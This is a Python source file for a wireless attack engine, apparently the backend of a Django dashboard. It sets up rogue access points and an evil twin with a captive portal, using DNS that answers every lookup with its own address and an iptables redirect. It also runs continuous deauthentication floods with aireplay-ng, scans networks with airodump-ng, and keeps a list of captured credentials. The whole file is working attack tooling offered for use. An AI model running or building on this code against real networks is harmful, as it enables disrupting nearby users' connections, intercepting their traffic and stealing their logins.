import threading
import subprocess
import os
import sys
import time
import csv
import collections
from datetime import datetime

# Global log buffer for Django to consume
log_buffer = collections.deque(maxlen=1000)

class WiFiPumpkinEngine:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor = "wlan0mon"
        self.ssid = "Free_WiFi"
        self.channel = "6"
        self.is_running = False
        self.target_bssid = ""
        self.scanned_networks = []
        self.clients = []
        self.is_scanning = False
        self.credentials = []
        self.dhcp_leases = []
        self.interfaces = self._get_real_interfaces()
        self.selected_interface = self.interfaces[0] if self.interfaces else "wlan0"
        self.monitor_mode = False
        self.mitm_method = "DNS Spoofing"
        self.traffic_stats = {"sent": [], "received": []}
        self.scanning_process = None
        self.ap_process = None
        self.dns_process = None
        
        if sys.platform != "win32" and os.getuid() != 0:
            self.log("ATTENTION: Root privileges required for hardware access!", "WARNING")

    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_msg = {
            "timestamp": timestamp,
            "level": level,
            "message": msg
        }
        log_buffer.append(formatted_msg)
        print(f"[{timestamp}] {level: <7} | {msg}")

    def run_command(self, cmd):
        if sys.platform == "win32":
            self.log(f"SIMULATING: {cmd}", "DEBUG")
            time.sleep(0.5)
            return "Simulated output"
            
        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if stdout: self.log(f"CMD OUT: {stdout[:100]}...", "CMD")
            if stderr: self.log(f"CMD ERR: {stderr[:100]}...", "ERROR")
            return stdout
        except Exception as e:
            self.log(f"Execution Error: {e}", "ERROR")
            return ""

    def _get_real_interfaces(self):
        if sys.platform == "win32":
            return ["wlan0", "eth0", "WiFi (Simulated)"]
        try:
            output = subprocess.check_output(["iw", "dev"]).decode()
            ifaces = [line.strip().split()[1] for line in output.split("\n") if "Interface" in line]
            return ifaces if ifaces else ["wlan0"]
        except:
            return ["wlan0"]

    def start_attack(self):
        if self.is_running: return False
        self.is_running = True
        self.log(f"Launching Rogue AP on {self.selected_interface}...", "START")
        
        if sys.platform != "win32":
            self._start_linux_ap()
        
        return True

    def _start_linux_ap(self):
        # hostapd config
        conf = f"""
interface={self.selected_interface}
ssid=NYX_Cyber_HUD
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
"""
        with open("/tmp/hostapd.conf", "w") as f: f.write(conf)
        self.ap_process = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # dnsmasq for DHCP
        dns_conf = f"""
interface={self.selected_interface}
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
"""
        with open("/tmp/dnsmasq.conf", "w") as f: f.write(dns_conf)
        subprocess.run(["ifconfig", self.selected_interface, "192.168.1.1", "netmask", "255.255.255.0", "up"])
        self.dns_process = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.PIPE)

    def stop_attack(self):
        self.is_running = False
        self.log("Shutting down engine...", "STOP")
        if self.ap_process: self.ap_process.terminate()
        if self.dns_process: self.dns_process.terminate()
        
        # Cleanup any remaining rogue processes
        if sys.platform != "win32":
            subprocess.run(["pkill", "hostapd"])
            subprocess.run(["pkill", "dnsmasq"])
            subprocess.run(["iptables", "--flush"])
            
        return True

    def start_evil_twin(self):
        self.log("Deploying Evil Twin + Captive Portal...", "INFO")
        hostapd_conf = f"interface={self.monitor}\nssid={self.ssid}\nhw_mode=g\nchannel={self.channel}\n"
        with open("/tmp/hostapd.conf", "w") as f: f.write(hostapd_conf)
        
        dnsmasq_conf = f"interface={self.monitor}\ndhcp-range=192.168.69.50,192.168.69.150,12h\naddress=/#/192.168.69.1\n"
        with open("/tmp/dnsmasq.conf", "w") as f: f.write(dnsmasq_conf)
        
        self.run_command(f"ifconfig {self.monitor} 192.168.69.1 netmask 255.255.255.0")
        self.run_command("sysctl -w net.ipv4.ip_forward=1")
        self.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
        
        self.run_command("php -S 0.0.0.0:8080 -t /tmp/portal &")
        self.log(f"Evil Twin active on {self.ssid}", "SUCCESS")

    def deauth_attack(self, bssid=None):
        target = bssid or self.target_bssid
        if not target:
            self.log("No target BSSID specified", "ERROR")
            return False
        self.log(f"Launching deauth on {target}", "INFO")
        threading.Thread(target=lambda: subprocess.run(f"aireplay-ng --deauth 0 -a {target} {self.monitor}", shell=True), daemon=True).start()
        return True

    def start_continuous_scan(self):
        if self.is_scanning: return False
        self.is_scanning = True
        self.log("Persistent survey started", "START")
        threading.Thread(target=self._scan_loop, daemon=True).start()
        return True

    def stop_continuous_scan(self):
        self.is_scanning = False
        self.log("Persistent survey stopped", "STOP")
        return True

    def _scan_loop(self):
        if sys.platform != "win32":
            csv_path = "/tmp/scan_results"
            self.scanning_process = subprocess.Popen(
                ["airodump-ng", self.selected_interface, "--write", csv_path, "--output-format", "csv"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
        while self.is_scanning:
            if sys.platform == "win32":
                import random
                # Simulated results
                self.scanned_networks = [
                    {"ssid": "Free_Coffee_WiFi", "bssid": "AA:BB:CC:DD:EE:01", "channel": "1", "signal": random.randint(-60, -40)},
                    {"ssid": "Airport_Guest", "bssid": "AA:BB:CC:DD:EE:02", "channel": "6", "signal": random.randint(-70, -50)},
                    {"ssid": "Corporate_Net", "bssid": "AA:BB:CC:DD:EE:03", "channel": "11", "signal": random.randint(-85, -70)}
                ]
            else:
                self._parse_airodump_csv(csv_path + "-01.csv")
            time.sleep(5)
            
        if self.scanning_process: self.scanning_process.terminate()

    def _parse_airodump_csv(self, path):
        if not os.path.exists(path): return
        try:
            with open(path, "r") as f:
                reader = csv.reader(f)
                networks = []
                section = 0
                for row in reader:
                    if not row: continue
                    if "BSSID" in row[0]: section = 1; continue
                    if "Station" in row[0]: section = 2; break
                    if section == 1:
                        if len(row) > 13:
                            networks.append({
                                "bssid": row[0].strip(),
                                "channel": row[3].strip(),
                                "signal": int(row[8].strip()),
                                "ssid": row[13].strip()
                            })
                self.scanned_networks = networks
        except Exception as e:
            self.log(f"Scan parse error: {str(e)}", "ERROR")

    def get_clients(self):
        if sys.platform == "win32":
            if self.is_running and len(self.clients) < 10:
                import random
                if random.random() > 0.6:
                    new_mac = f"00:11:22:33:44:{random.randint(10,99)}"
                    self.clients.append({
                        "mac": new_mac,
                        "ip": f"192.168.69.{len(self.clients)+50}",
                        "vendor": random.choice(["Apple Inc.", "Samsung Electronics", "Google LLC"]),
                        "first_seen": datetime.now().strftime("%H:%M:%S")
                    })
                    self.dhcp_leases.append({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "mac": new_mac,
                        "ip": f"192.168.69.{len(self.clients)+50}",
                        "hostname": f"device-{random.randint(100,999)}"
                    })
                    # Simulate credential capture
                    if random.random() > 0.8:
                        self.credentials.append({
                            "timestamp": datetime.now().strftime("%H:%M:%S"),
                            "target": new_mac,
                            "service": "Google Auth",
                            "user": f"user{random.randint(1,100)}@gmail.com",
                            "pass": "********"
                        })
        return self.clients

    def scan_onvif(self):
        self.log("Scanning for ONVIF devices...", "INFO")
        def _scan():
            time.sleep(2)
            self.log("[+] Found ONVIF Camera at 192.168.1.100", "SUCCESS")
        threading.Thread(target=_scan, daemon=True).start()
        return True

    def list_interfaces(self):
        return self.interfaces

    def set_interface(self, iface):
        self.selected_interface = iface
        self.log(f"Primary interface set to {iface}", "INFO")
        return True

    def toggle_monitor(self, state):
        self.monitor_mode = state
        if sys.platform != "win32":
            cmd = ["airmon-ng", "start" if state else "stop", self.selected_interface]
            subprocess.run(cmd)
            # Update selected interface to mon version if starting
            if state: self.selected_interface += "mon"
            else: self.selected_interface = self.selected_interface.replace("mon", "")
            
        status = "ENABLED" if state else "DISABLED"
        self.log(f"Monitor mode {status} on {self.selected_interface}", "SUCCESS")
        return True

    def set_mitm_method(self, method):
        self.mitm_method = method
        self.log(f"MITM vector switched to {method}", "INFO")
        return True

    def get_stats(self):
        import random
        self.traffic_stats["sent"].append(random.randint(10, 100))
        self.traffic_stats["received"].append(random.randint(50, 500))
        if len(self.traffic_stats["sent"]) > 20:
            self.traffic_stats["sent"].pop(0)
            self.traffic_stats["received"].pop(0)
        return self.traffic_stats

# Initialize a global engine instance
engine = WiFiPumpkinEngine()
